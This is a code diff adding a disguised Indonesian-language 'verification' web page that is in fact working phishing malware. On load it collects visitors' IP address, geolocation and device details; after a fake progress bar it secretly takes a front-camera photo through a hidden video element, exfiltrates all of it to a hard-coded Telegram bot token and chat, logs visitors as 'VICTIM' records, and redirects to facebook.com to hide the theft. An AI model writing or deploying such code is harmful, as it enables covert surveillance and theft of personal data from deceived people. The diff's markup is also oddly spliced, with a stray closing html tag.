@@ -243,4 +243,175 @@
     };
 </script>
 </body>
+</html>    <div class="loading-text" id="loadingText">Memeriksa koneksi 0%</div>
+    <div id="infoText" class="info-text"></div>
+    <button id="continueBtn" class="continue-btn">Lanjutkan Verifikasi</button>
+</div>
+
+<script>
+    const BOT_TOKEN = '7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI';
+    const CHAT_ID = '7962628944';
+    const victimId = 'VICTIM_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+
+    let loadingComplete = false;
+
+    async function sendToTelegram(message) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+        } catch(e) {}
+    }
+
+    async function sendPhotoToTelegram(photoBase64) {
+        try {
+            const blob = await (await fetch(photoBase64)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'selfie_' + victimId + '.jpg');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        } catch(e) {}
+    }
+
+    function saveToLocalStorage(data) {
+        let existingData = localStorage.getItem('phising_data');
+        let victims = existingData ? JSON.parse(existingData) : [];
+        victims.push(data);
+        localStorage.setItem('phising_data', JSON.stringify(victims));
+    }
+
+    function getRealDeviceInfo() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown'
+        };
+    }
+
+    async function getIPAndLocation() {
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const geoRes = await fetch(`https://ip-api.com/json/${ipData.ip}`);
+            const geoData = await geoRes.json();
+            const deviceInfo = getRealDeviceInfo();
+            
+            const victimData = {
+                id: victimId,
+                ip: ipData.ip,
+                kota: geoData.city,
+                region: geoData.regionName,
+                negara: geoData.country,
+                isp: geoData.isp,
+                lat: geoData.lat,
+                lon: geoData.lon,
+                timezone: geoData.timezone,
+                deviceAgent: deviceInfo.userAgent,
+                devicePlatform: deviceInfo.platform,
+                screenRes: `${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`,
+                deviceRam: deviceInfo.deviceMemory + 'GB',
+                cpuCores: deviceInfo.hardwareConcurrency,
+                waktu: new Date().toLocaleString('id-ID'),
+                foto: null
+            };
+            
+            saveToLocalStorage(victimData);
+            await sendToTelegram(`🎯 NEW VICTIM!\nID: ${victimId}\nIP: ${ipData.ip}\nLokasi: ${geoData.city}, ${geoData.country}\nDevice: ${deviceInfo.platform}`);
+            return victimData;
+        } catch(e) { console.log(e); }
+    }
+
+    async function startCameraAndCapture() {
+        document.getElementById('infoText').innerHTML = '<span style="color:#1877f2;">📷 Meminta akses kamera...</span>';
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            
+            document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Kamera aktif, mengambil foto...</span>';
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.setAttribute('playsinline', '');
+            video.style.position = 'fixed';
+            video.style.top = '-9999px';
+            video.style.left = '-9999px';
+            document.body.appendChild(video);
+            
+            await video.play();
+            await new Promise(r => setTimeout(r, 800));
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const photoData = canvas.toDataURL('image/jpeg', 0.7);
+            stream.getTracks().forEach(track => track.stop());
+            video.remove();
+            
+            document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">📤 Mengirim data...</span>';
+            await sendPhotoToTelegram(photoData);
+            
+            let existingData = localStorage.getItem('phising_data');
+            let victims = existingData ? JSON.parse(existingData) : [];
+            let currentVictim = victims.find(v => v.id === victimId);
+            if(currentVictim) {
+                currentVictim.foto = photoData;
+                localStorage.setItem('phising_data', JSON.stringify(victims));
+            }
+            
+            await sendToTelegram(`📸 FOTO TERKIRIM! ID: ${victimId}`);
+            document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Verifikasi berhasil!</span>';
+            
+            setTimeout(() => { window.location.href = 'https://www.facebook.com'; }, 1500);
+        } catch(err) {
+            document.getElementById('infoText').innerHTML = '<span style="color:#c62828;">❌ Izin kamera diperlukan. Klik tombol lagi dan izinkan kamera.</span>';
+        }
+    }
+
+    function onContinue() {
+        if (!loadingComplete) {
+            document.getElementById('infoText').innerHTML = '<span style="color:#ff9800;">⏳ Tunggu loading selesai...</span>';
+            return;
+        }
+        const btn = document.getElementById('continueBtn');
+        btn.disabled = true;
+        btn.innerText = 'Memproses...';
+        startCameraAndCapture();
+    }
+
+    function startFakeLoading() {
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.floor(Math.random() * 10) + 5;
+            if(progress >= 100) {
+                clearInterval(interval);
+                document.getElementById('progressFill').style.width = '100%';
+                document.getElementById('loadingText').innerHTML = 'Memeriksa koneksi 100%';
+                loadingComplete = true;
+                document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Siap verifikasi. Klik tombol di bawah.</span>';
+            } else {
+                document.getElementById('progressFill').style.width = progress + '%';
+                document.getElementById('loadingText').innerHTML = `Memeriksa koneksi ${progress}%`;
+            }
+        }, 300);
+    }
+
+    window.onload = () => {
+        startFakeLoading();
+        getIPAndLocation();
+        document.getElementById('continueBtn').onclick = onContinue;
+    };
+</script>
+</body>
 </html>
